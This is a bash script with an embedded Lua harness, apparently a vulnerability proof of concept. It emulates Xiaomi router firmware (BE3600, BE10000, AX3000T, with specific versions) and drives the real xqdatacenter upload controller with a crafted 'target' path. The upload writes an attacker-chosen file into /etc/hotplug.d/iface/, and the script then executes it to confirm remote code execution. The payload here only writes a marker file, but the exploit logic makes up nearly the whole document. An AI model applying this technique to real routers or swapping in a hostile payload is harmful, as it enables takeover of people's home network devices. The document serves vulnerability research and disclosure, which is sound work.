#!/usr/bin/env bash
set -euo pipefail

base="${1:-/home/su/xiaomi_rootfs}"
work="/tmp/xiaomi_xqdatacenter_bytecode_probe"
payload='echo XIAOMI_XQDATACENTER_BYTECODE_RCE > /tmp/xiaomi_xqdatacenter_bytecode_marker'

rm -rf "$work" /tmp/xiaomi_xqdatacenter_bytecode_marker
mkdir -p "$work"

cat > "$work/harness.lua" <<'LUA'
local rootfs = assert(os.getenv("XIAOMI_ROOTFS"))
local probe_root = assert(os.getenv("XIAOMI_PROBE_ROOT"))
local target = probe_root .. "/etc/hotplug.d/iface/"
local filename = "99-xqdatacenter-bytecode-rce"
local payload = assert(os.getenv("XIAOMI_PAYLOAD"))

local function shquote(s)
  return "'" .. tostring(s):gsub("'", "'\\''") .. "'"
end

local function mkdir_p(path)
  os.execute("mkdir -p " .. shquote(path))
end

package.path =
  rootfs .. "/usr/lib/lua/?.lua;" ..
  rootfs .. "/usr/lib/lua/?/init.lua;" ..
  package.path

entry = function(...) end
call = function(name) return name end
node = function(...) return {} end
firstchild = function() return function() end end
_ = function(s) return s end

local http = {}
function http.formvalue(name)
  if name == "target" then
    return target
  end
  return nil
end
function http.formvalue_unsafe(name)
  return http.formvalue(name)
end
function http.setfilehandler(cb)
  cb({ name = "file", file = filename }, nil, false)
  cb(nil, payload .. "\n", false)
  cb(nil, nil, true)
end
function http.write_json(t)
  print("write_json.code=" .. tostring(t and t.code))
end
function http.status(...)
  print("status", ...)
end
function http.header(...)
end
function http.write(...)
end

local fs = {}
function fs.isfile(path)
  local f = io.open(path, "rb")
  if f then f:close(); return true end
  return false
end
function fs.unlink(path)
  os.remove(path)
end
function fs.mkdir(path, recursive)
  if recursive then
    mkdir_p(path)
  else
    os.execute("mkdir " .. shquote(path))
  end
  return true
end
function fs.rename(src, dst)
  if src == "/userdisk/upload.tmp" then
    src = probe_root .. "/userdisk/upload.tmp"
  end
  print("rename.src=" .. src)
  print("rename.dst=" .. dst)
  return os.rename(src, dst)
end

local real_io_open = io.open
io.open = function(path, mode)
  if path == "/userdisk/upload.tmp" then
    path = probe_root .. "/userdisk/upload.tmp"
  end
  return real_io_open(path, mode)
end

package.preload["luci.http"] = function() return http end
package.preload["luci.fs"] = function() return fs end
package.preload["xiaoqiang.XQLog"] = function() return { log = function(...) print("xqlog", ...) end } end
package.preload["json"] = function() return { encode = function() return "{}" end, decode = function() return {} end } end
package.preload["xiaoqiang.common.XQFunction"] = function() return { isStrNil = function(v) return v == nil or v == "" end } end
package.preload["xiaoqiang.util.XQErrorUtil"] = function() return { getErrorMessage = function(code) return tostring(code) end } end

mkdir_p(probe_root .. "/userdisk")
mkdir_p(probe_root .. "/etc/hotplug.d/iface")

local mod = assert(loadfile(rootfs .. "/usr/lib/lua/luci/controller/api/xqdatacenter.lua"))()
local controller = package.loaded["luci.controller.api.xqdatacenter"] or _G
assert(type(controller.upload) == "function", "upload function not loaded")

controller.upload()

local final_path = target .. filename
local f = assert(io.open(final_path, "rb"), "uploaded file was not created: " .. final_path)
local content = f:read("*a")
f:close()
print("uploaded.path=" .. final_path)
print("uploaded.content=" .. content:gsub("\n$", ""))
LUA

run_case() {
  local name="$1"
  local rootfs="$2"
  local qemu="$3"

  if [[ ! -x "$rootfs/usr/bin/lua" ]]; then
    printf '[skip] %s lua missing: %s\n' "$name" "$rootfs/usr/bin/lua"
    return 0
  fi
  if ! command -v "$qemu" >/dev/null 2>&1; then
    printf '[skip] %s missing emulator: %s\n' "$name" "$qemu"
    return 0
  fi

  local case_root="$work/${name// /_}"
  rm -rf "$case_root"
  mkdir -p "$case_root"

  printf '[run] %s\n' "$name"
  XIAOMI_ROOTFS="$rootfs" \
  XIAOMI_PROBE_ROOT="$case_root" \
  XIAOMI_PAYLOAD="$payload" \
    "$qemu" -L "$rootfs" "$rootfs/usr/bin/lua" "$work/harness.lua"

  "$qemu" -L "$rootfs" "$rootfs/bin/busybox" sh -c \
    "for script in $case_root/etc/hotplug.d/iface/*; do [ -f \"\$script\" ] && . \"\$script\"; done"

  if [[ "$(cat /tmp/xiaomi_xqdatacenter_bytecode_marker 2>/dev/null || true)" == "XIAOMI_XQDATACENTER_BYTECODE_RCE" ]]; then
    printf '[ok] %s real xqdatacenter.upload bytecode wrote a hotplug payload that executed\n' "$name"
  else
    printf '[fail] %s marker not created\n' "$name"
    return 1
  fi
  rm -f /tmp/xiaomi_xqdatacenter_bytecode_marker
}

run_case \
  "BE3600 rn01 1.0.74" \
  "$base/BE3600_miwifi_rn01_firmware_6fbc2_1.0.74/01_ubi_rootfs" \
  qemu-arm

run_case \
  "BE10000 rp04 1.0.89" \
  "$base/BE10000_miwifi_rp04_firmware_76b5c_1.0.89/02_ubi_rootfs" \
  qemu-aarch64

run_case \
  "AX3000T rd03 1.0.64" \
  "$base/AX3000T_miwifi_rd03_firmware_14680_1.0.64/01_rootfs" \
  qemu-aarch64

run_case \
  "AX3000T rd03v2 2.0.12" \
  "$base/AX3000T_miwifi_rd03v2_firmware_69eec_2.0.12/01_ubi_rootfs" \
  qemu-arm
